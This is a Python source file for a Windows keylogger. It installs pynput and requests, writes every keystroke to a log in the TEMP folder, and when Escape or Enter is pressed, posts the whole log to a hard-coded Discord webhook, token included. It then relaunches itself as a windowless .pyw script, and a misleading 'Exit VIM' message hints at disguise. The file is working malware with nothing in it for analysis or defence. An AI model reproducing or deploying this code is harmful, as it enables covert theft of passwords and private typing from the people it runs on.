import time
import os

try:
	import pynput
	import requests
	from pynput.keyboard import Key, Listener
except:
	os.system('pip install pynput')
	os.system('pip install requests')
	import pynput
	import requests
finally:
	import pynput
	import requests
	from pynput.keyboard import Key, Listener

def restartAPP():
	print(os.getcwd())
	# os.startfile("kl_r.py")
	os.startfile("kl_d.pyw")

keys = []
logPATH = os.getenv('TEMP') + '\\log.txt'

hookTEMPLATE = 'https://discord.com/api/webhooks/'
hookURL = hookTEMPLATE + '959774283591221268/ef1oo8SOHlgOb3wpmI_zuNC63I72OAqyiTmpYqGWZMb24UUGENM7YJwCVHaQ0GcF90Nm' # LIVE
escHOOK = hookTEMPLATE + '959774361546530886/kzdmKwLRuoZnXEgxm-lwn_50FN9TQ6gJZnRBwO7-V3R47lQYyu36uUJ3-CozqUtf_rSb' # ESC

def sendHOOK(letter, uri):
	bot = {"content": letter,
			"username": str(int(time.time())),
			"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/959791245339787274/unknown.png',
			"tts": "false"}
	response = requests.post(uri, json=bot)
	pass

def on_press(key):
	
	keys.append(key)
	write_file(keys)
	
	try:
		print('Input Detected...'.format(key.char))
# 		sendHOOK(key.char, hookURL)
	except AttributeError:
		print('Press Escape to Exit VIM...'.format(key))
# 		sendHOOK(str(key), hookURL)

	if key == Key.esc or key == Key.enter:
		# Stop listener
		with open(logPATH) as f:
			contents = f.read()
			print("\n\n\n\n" + contents)
		sendHOOK("```\n" + contents + "\n```", escHOOK)
		restartAPP()
		return False
		
def write_file(keys):
	
	with open(logPATH, 'w') as f:
		for key in keys:
			
			# removing ''
			k = str(key).replace("'", "")
			f.write(k)
					
			# explicitly adding a space after
			# every keystroke for readability
			f.write(' ')

def on_release(key):
					
	print('{0} released'.format(key))
	# if key == Key.esc:
	# 	# Stop listener
	# 	with open(logPATH) as f:
	# 		contents = f.read()
	# 		print("\n\n\n\n" + contents)
	# 	sendHOOK("```\n" + contents + "\n```", escHOOK)
	# 	return False


with Listener(on_press = on_press,
			on_release = on_release) as listener:
					
	listener.join()
